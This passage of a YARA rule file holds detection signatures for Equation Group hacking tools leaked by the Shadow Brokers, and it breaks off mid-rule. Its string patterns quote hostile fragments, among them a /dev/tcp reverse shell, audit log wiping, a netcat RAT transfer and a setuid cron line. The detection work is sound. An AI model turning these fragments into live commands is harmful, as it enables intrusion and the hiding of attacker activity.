      $s1 = "_lib_version" ascii
      $s2 = ",%02d%03d" fullword ascii
      $s3 = "TRANSIT" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 200KB and all of them )
}

rule EquationGroup_morerats_client_noprep_RID3601 : APT DEMO G0020 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 16:37:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "a5b191a8ede8297c5bba790ef95201c516d64e2898efaeb44183f8fdfad578bb"
      tags = "APT, DEMO, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "storestr = 'echo -n \"%s\" | Store --nullterminate --file=\"%s\" --set=\"%s\"' % (nopenargs, outfile, VAR_NAME)" fullword ascii
      $x2 = "The NOPEN-args provided are injected into infile if it is a valid" fullword ascii
      $x3 = " -i                do not autokill after 5 hours" fullword ascii
   condition: 
      ( filesize < 9KB and 1 of them )
}

rule EquationGroup_cursezinger_linuxrh7_3_v_2_0_0_RID382A : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 18:09:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "af7c7d03f59460fa60c48764201e18f3bd3f72441fd2e2ff6a562291134d2135"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = ",%02d%03d" fullword ascii
      $s2 = "[%.2u%.2u%.2u%.2u%.2u%.2u]" fullword ascii
      $s3 = "__strtoll_internal" ascii
      $s4 = "__strtoul_internal" ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 400KB and all of them )
}

rule EquationGroup_seconddate_ImplantStandalone_3_0_3_RID39CD : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 19:19:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "d687aa644095c81b53a69c206eb8d6bdfe429d7adc2a57d87baf8ff8d4233511"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "EFDGHIJKLMNOPQRSUT" fullword ascii
      $s2 = "G8HcJ HcF LcF0LcN" fullword ascii
      $s3 = "GhHcJ0HcF@LcF0LcN8H" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 1000KB and all of them )
}

rule EquationGroup_gr_dev_bin_post_RID32F7 : APT DEMO G0020 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 14:27:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "c1546155efa95dbc4e3cc95299a3968fc075f89d33164e78b00b76c7d08a0591"
      tags = "APT, DEMO, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "op=cron&action=once&frame=cronOnceFrame&cronK=cronV&cronCommand=%2Ftmp%2Ftmpwatch&time=12%3A12+01%2F28%2F2005" ascii
   condition: 
      ( filesize < 1KB and all of them )
}

rule EquationGroup_curseyo_win2k_v_1_0_0_RID349A : APT DEMO EXE FILE G0020 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 15:37:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "5dc77614764b23a38610fdd8abe5b2274222f206889e4b0974a3fea569055ed6"
      tags = "APT, DEMO, EXE, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "0123456789abcdefABCEDF:" fullword ascii
      $op0 = { c6 06 5b 8b bd 70 ff ff ff 8b 9d 64 ff ff ff 0f } 
      $op1 = { 55 b8 ff ff ff ff 89 e5 83 ec 28 89 7d fc 8b 7d } 
      $op2 = { ff 05 10 64 41 00 89 34 24 e8 df 1e 00 00 e9 31 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )
}

rule EquationGroup_gr_RID2D9C : APT DEMO G0020 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 10:39:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "d3cd725affd31fa7f0e2595f4d76b09629918612ef0d0307bb85ade1c3985262"
      tags = "APT, DEMO, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "if [ -f /tmp/tmpwatch ] ; then" fullword ascii
      $s2 = "echo \"bailing. try a different name\"" fullword ascii
   condition: 
      ( filesize < 1KB and all of them )
}

rule EquationGroup_curseroot_win2k_v_2_1_0_RID3578 : APT DEMO EXE FILE G0020 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 16:14:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "a1637948ed6ebbd2e582eb99df0c06b27a77c01ad1779b3d84c65953ca2cb603"
      tags = "APT, DEMO, EXE, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/%s,%s" fullword ascii
      $op0 = { c7 44 24 04 ff ff ff ff 89 04 24 e8 46 65 01 00 } 
      $op1 = { 8d 5d 88 89 1c 24 e8 24 1b 01 00 be ff ff ff ff } 
      $op2 = { d3 e0 48 e9 0c ff ff ff 8b 45 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and $s1 and 2 of ( $op* ) )
}

rule EquationGroup_cursewham_curserazor_cursezinger_curseroot_win2k_RID40E0 : APT DEMO EXE FILE G0020 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 00:21:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "aff27115ac705859871ab1bf14137322d1722f63705d6aeada43d18966843225"
      hash2 = "7a25e26950bac51ca8d37cec945eb9c38a55fa9a53bc96da53b74378fb10b67e"
      tags = "APT, DEMO, EXE, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/%s,%s" fullword ascii
      $s3 = ",%02d%03d" fullword ascii
      $s4 = "[%.2u%.2u%.2u%.2u%.2u%.2u]" fullword ascii
      $op1 = { 7d ec 8d 74 3f 01 0f af f7 c1 c6 05 } 
      $op2 = { 29 f1 89 fb d3 eb 89 f1 d3 e7 } 
      $op3 = { 7d e4 8d 5c 3f 01 0f af df c1 c3 05 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 3 of them )
}

rule EquationGroup_watcher_linux_i386_v_3_3_0_RID3631 : APT DEMO FILE G0020 LINUX {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 16:45:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "ce4c9bfa25b8aad8ea68cc275187a894dec5d79e8c0b2f2f3ec4184dc5f402b8"
      tags = "APT, DEMO, FILE, G0020, LINUX"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "invalid option `" fullword ascii
      $s8 = "readdir64" fullword ascii
      $s9 = "89:z89:%r%opw" fullword wide
      $s13 = "Ropopoprstuvwypypop" fullword wide
      $s17 = "Missing argument for `-x'." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 700KB and all of them )
}

rule EquationGroup_charm_saver_win2k_v_2_0_0_RID361C : APT DEMO EXE FILE G0020 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 16:41:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "0f7936a37482532a8ba5df4112643ed7579dd0e59181bfca9c641b9ba0a9912f"
      tags = "APT, DEMO, EXE, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "0123456789abcdefABCEDF:" fullword ascii
      $op0 = { b8 ff ff ff ff 7f 65 eb 30 8b 55 0c 89 d7 0f b6 } 
      $op2 = { ba ff ff ff ff 83 c4 6c 89 d0 5b 5e 5f 5d c3 90 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them )
}

rule EquationGroup_cursehappy_win2k_v_6_1_0_RID35DA : APT DEMO EXE FILE G0020 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 16:30:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "eb669afd246a7ac4de79724abcce5bda38117b3138908b90cac58936520ea632"
      tags = "APT, DEMO, EXE, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $op1 = { e8 24 2c 01 00 85 c0 89 c6 ba ff ff ff ff 74 d6 } 
      $op2 = { 89 4c 24 04 89 34 24 89 44 24 08 e8 ce 49 ff ff } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them )
}

rule EquationGroup_morerats_client_Store_RID357A : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 16:14:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "619944358bc0e1faffd652b6af0600de055c5e7f1f1d91a8051ed9adf5a5b465"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "[-] Failed to mmap file: %s" fullword ascii
      $s2 = "[-] can not NULL terminate input data" fullword ascii
      $s3 = "Missing argument for `-x'." fullword ascii
      $s4 = "[!] Value has size of 0!" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 60KB and 2 of them )
}

rule EquationGroup_watcher_linux_x86_64_v_3_3_0_RID36D6 : APT DEMO FILE G0020 LINUX {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 17:12:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "a8d65593f6296d6d06230bcede53b9152842f1eee56a2a72b0a88c4f463a09c3"
      tags = "APT, DEMO, FILE, G0020, LINUX"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "forceprismheader" fullword ascii
      $s2 = "invalid option `" fullword ascii
      $s3 = "forceprism" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 900KB and all of them )
}

rule EquationGroup_linux_exactchange_RID33CD : APT DEMO FILE G0020 LINUX {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 15:03:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "dfecaf5b85309de637b84a686dd5d2fca9c429e8285b7147ae4213c1f49d39e6"
      hash2 = "6ef6b7ec1f1271503957cf10bb6b1bfcedb872d2de3649f225cf1d22da658bec"
      hash3 = "39d4f83c7e64f5b89df9851bdba917cf73a3449920a6925b6cd379f2fdec2a8b"
      tags = "APT, DEMO, FILE, G0020, LINUX"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "[+] looking for vulnerable socket" fullword ascii
      $x2 = "can't use 32-bit exploit on 64-bit target" fullword ascii
      $x3 = "[+] %s socket ready, exploiting..." fullword ascii
      $x4 = "[!] nothing looks vulnerable, trying everything" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 2000KB and 1 of them )
}

rule EquationGroup_x86_linux_exactchange_RID3512 : APT DEMO FILE G0020 LINUX {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 15:57:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "dfecaf5b85309de637b84a686dd5d2fca9c429e8285b7147ae4213c1f49d39e6"
      hash2 = "6ef6b7ec1f1271503957cf10bb6b1bfcedb872d2de3649f225cf1d22da658bec"
      tags = "APT, DEMO, FILE, G0020, LINUX"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "kernel has 4G/4G split, not exploitable" fullword ascii
      $x2 = "[+] kernel stack size is %d" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 1000KB and 1 of them )
}

rule EquationGroup_emptycriss_RID3116 : APT DEMO G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file emptycriss"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 13:07:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "a698d35a0c4d25fd960bd40c1de1022bb0763b77938bf279e91c9330060b0b91"
      tags = "APT, DEMO, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "./emptycriss <target IP>" fullword ascii
      $s2 = "Cut and paste the following to the telnet prompt:" fullword ascii
      $s8 = "environ define TTYPROMPT abcdef" fullword ascii
   condition: 
      ( filesize < 50KB and 1 of them )
}

rule EquationGroup_scripme_RID2FB6 : APT DEMO G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file scripme"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:08:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "a1adf1c1caad96e7b7fd92cbf419c4cfa13214e66497c9e46ec274a487cd098a"
      tags = "APT, DEMO, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "running \\\"tcpdump -n -n\\\", on the environment variable \\$INTERFACE, scripted" fullword ascii
      $x2 = "Cannot read $opetc/scripme.override -- are you root?" ascii
      $x3 = "$ENV{EXPLOIT_SCRIPME}" ascii
      $x4 = "$opetc/scripme.override" ascii
   condition: 
      ( filesize < 30KB and 1 of them )
}

rule EquationGroup_cryptTool_RID3093 : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file cryptTool"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:45:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "96947ad30a2ab15ca5ef53ba8969b9d9a89c48a403e8b22dd5698145ac6695d2"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "The encryption key is " fullword ascii
      $s2 = "___tempFile2.out" ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 200KB and all of them )
}

rule EquationGroup_dumppoppy_RID30B1 : APT DEMO G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file dumppoppy"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:50:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "4a5c01590063c78d03c092570b3206fde211daaa885caac2ab0d42051d4fc719"
      tags = "APT, DEMO, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Unless the -c (clobber) option is used, if two RETR commands of the" fullword ascii
      $x2 = "mywarn(\"End of $destfile determined by \\\"^Connection closed by foreign host\\\"\")" fullword ascii
      $l1 = "End of $destfile determined by \"^Connection closed by foreign host" 
   condition: 
      ( filesize < 20KB and 1 of them )
}

rule EquationGroup_Auditcleaner_RID3194 : APT DEMO G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file Auditcleaner"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 13:28:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "8c172a60fa9e50f0df493bf5baeb7cc311baef327431526c47114335e0097626"
      tags = "APT, DEMO, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "> /var/log/audit/audit.log; rm -f ." ascii
      $x2 = "Pastables to run on target:" ascii
      $x3 = "cp /var/log/audit/audit.log .tmp" ascii
      $l1 = "Here is the first good cron session from" fullword ascii
      $l2 = "No need to clean LOGIN lines." fullword ascii
   condition: 
      ( filesize < 300KB and 1 of them )
}

rule EquationGroup_reverse_shell_RID3236 : APT DEMO G0020 SCRIPT {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file reverse.shell.script"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 13:55:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "d29aa24e6fb9e3b3d007847e1630635d6c70186a36c4ab95268d28aa12896826"
      tags = "APT, DEMO, G0020, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "sh >/dev/tcp/" ascii
      $s2 = " <&1 2>&1" fullword ascii
   condition: 
      ( filesize < 1KB and all of them )
}

rule EquationGroup_tnmunger_RID3033 : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file tnmunger"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:29:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "1ab985d84871c54d36ba4d2abd9168c2a468f1ba06994459db06be13ee3ae0d2"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "TEST: mungedport=%6d  pp=%d  unmunged=%6d" fullword ascii
      $s2 = "mungedport=%6d  pp=%d  unmunged=%6d" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 10KB and 1 of them )
}

rule EquationGroup_ys_ratload_RID30F5 : APT DEMO FILE G0020 SCRIPT {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file ys.ratload.sh"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 13:02:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "a340e5b5cfd41076bd4d6ad89d7157eeac264db97a9dddaae15d935937f10d75"
      tags = "APT, DEMO, FILE, G0020, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "echo \"example: ${0} -l 192.168.1.1 -p 22222 -x 9999\"" fullword ascii
      $x2 = "-x [ port to start mini X server on DEFAULT = 12121 ]\"" fullword ascii
      $x3 = "CALLBACK_PORT=32177" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x2123 and filesize < 3KB and 1 of them )
}

rule EquationGroup_eh_1_1_0_RID2F3F : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file eh.1.1.0.0"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 11:49:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "0f8dd094516f1be96da5f9addc0f97bcac8f2a348374bd9631aa912344559628"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "usage: %s -e -v -i target IP [-c Cert File] [-k Key File]" fullword ascii
      $x2 = "TYPE=licxfer&ftp=%s&source=/var/home/ftp/pub&version=NA&licfile=" ascii
      $x3 = "[-l Log File] [-m save MAC time file(s)] [-p Server Port]" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 100KB and 1 of them )
}

rule EquationGroup_toast_v3_2_0_RID3116 : APT DEMO FILE G0020 LINUX {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file toast_v3.2.0.1-linux"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 13:07:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2ce2d16d24069dc29cf1464819a9dc6deed38d1e5ffc86d175b06ddb691b648b"
      tags = "APT, DEMO, FILE, G0020, LINUX"
      minimum_yara = "3.5.0"
      
   strings:
      $x2 = "Del --- Usage: %s -l file -w wtmp -r user" fullword ascii
      $s5 = "Roasting ->%s<- at ->%d:%d<-" ascii
      $s6 = "rbnoil -Roasting ->" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 50KB and 1 of them )
}

rule EquationGroup_sshobo_RID2F51 : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file sshobo"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 11:52:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "c7491898a0a77981c44847eb00fb0b186aa79a219a35ebbca944d627eefa7d45"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Requested forwarding of port %d but user is not root." fullword ascii
      $x2 = "internal error: we do not read, but chan_read_failed for istate" fullword ascii
      $x3 = "~#  - list forwarded connections" fullword ascii
      $x4 = "packet_inject_ignore: block" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 600KB and all of them )
}

rule EquationGroup_magicjack_v1_1_0_0_client_1_1_0_0_RID382D : APT DEMO FILE G0020 SCRIPT {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file magicjack_v1.1.0.0_client-1.1.0.0.py"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 18:10:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "63292a2353275a3bae012717bb500d5169cd024064a1ce8355ecb4e9bfcdfdd1"
      tags = "APT, DEMO, FILE, G0020, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "result = self.send_command(\"ls -al %s\" % self.options.DIR)" fullword ascii
      $x2 = "cmd += \"D=-l%s \" % self.options.LISTEN_PORT" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x2123 and filesize < 80KB and 1 of them )
}

rule EquationGroup_packrat_RID2FA9 : APT DEMO G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file packrat"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:06:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "d3e067879c51947d715fc2cf0d8d91c897fe9f50cae6784739b5c17e8a8559cf"
      tags = "APT, DEMO, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x2 = "Use this on target to get your RAT:" fullword ascii
      $x3 = "$ratremotename && " fullword ascii
      $x5 = "$command = \"$nc$bindto -vv -l -p $port < ${ratremotename}\" ;" fullword ascii
   condition: 
      ( filesize < 70KB and 1 of them )
}

rule EquationGroup_telex_RID2EE5 : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file telex"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 11:34:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "e9713b15fc164e0f64783e7a2eac189a40e0a60e2268bd7132cfdc624dfe54ef"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "usage: %s -l [ netcat listener ] [ -p optional target port instead of 23 ] <ip>" fullword ascii
      $x2 = "target is not vulnerable. exiting" fullword ascii
      $s3 = "Sending final buffer: evil_blocks and shellcode..." fullword ascii
      $s4 = "Timeout waiting for daemon to die.  Exploit probably failed." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 50KB and 1 of them )
}

rule EquationGroup_porkclient_RID30FE : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file porkclient"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 13:03:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "5c14e3bcbf230a1d7e2909876b045e34b1486c8df3c85fb582d9c93ad7c57748"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "-c COMMAND: shell command string" fullword ascii
      $s2 = "Cannot combine shell command mode with args to do socket reuse" fullword ascii
      $s3 = "-r: Reuse socket for Nopen connection (requires -t, -d, -f, -n, NO -c)" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 30KB and 1 of them )
}

rule EquationGroup_electricslide_RID321F : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file electricslide"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 13:51:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "d27814b725568fa73641e86fa51850a17e54905c045b8b31a9a5b6d2bdc6f014"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Firing with the same hosts, on altername ports (target is on 8080, listener on 443)" fullword ascii
      $x2 = "Recieved Unknown Command Payload: 0x%x" fullword ascii
      $x3 = "Usage: eslide   [options] <-t profile> <-l listenerip> <targetip>" fullword ascii
      $x4 = "-------- Delete Key - Remove a *closed* tab" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 2000KB and 1 of them )
}

rule EquationGroup_wrap_telnet_RID3168 : APT DEMO FILE G0020 SCRIPT {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file wrap-telnet.sh"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 13:21:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "4962b307a42ba18e987d82aa61eba15491898978d0e2f0e4beb02371bf0fd5b4"
      tags = "APT, DEMO, FILE, G0020, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "echo \"example: ${0} -l 192.168.1.1 -p 22222 -s 22223 -x 9999\"" fullword ascii
      $s2 = "-x [ port to start mini X server on DEFAULT = 12121 ]\"" fullword ascii
      $s3 = "echo \"Call back port2 = ${SPORT}\"" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x2123 and filesize < 4KB and 1 of them )
}

rule EquationGroup_elgingamble_RID313A : APT DEMO G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file elgingamble"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 13:13:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "0573e12632e6c1925358f4bfecf8c263dd13edf52c633c9109fe3aae059b49dd"
      tags = "APT, DEMO, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "* * * * * root chown root %s; chmod 4755 %s; %s" fullword ascii
